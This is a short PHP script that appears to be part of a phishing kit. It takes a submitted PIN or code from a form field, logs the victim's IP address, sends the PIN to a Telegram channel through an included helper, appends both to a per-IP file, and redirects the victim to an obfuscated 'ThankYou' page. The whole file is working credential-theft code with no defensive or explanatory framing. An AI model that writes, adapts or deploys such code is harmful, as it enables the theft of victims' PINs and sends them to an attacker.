<?php

require('telegram.php');



$ip = getenv("REMOTE_ADDR");
$pin = $_POST['exited'];
$message .= "$pin\n";
$message .= "$ip\n";

telegram("------------------");
telegram($pin);
telegram("------------------");


$save = $file = fopen("../us-en/zaznew/code_{$ip}.txt", 'a');
fwrite($save, $message);

header("Location: ThankYou/?LJZSTGYCVDBIQHAMREN/C_uYnjgpdHe/LOQZCTIKFNLUGEXVDMBPSEUktiRcqbhm");

?>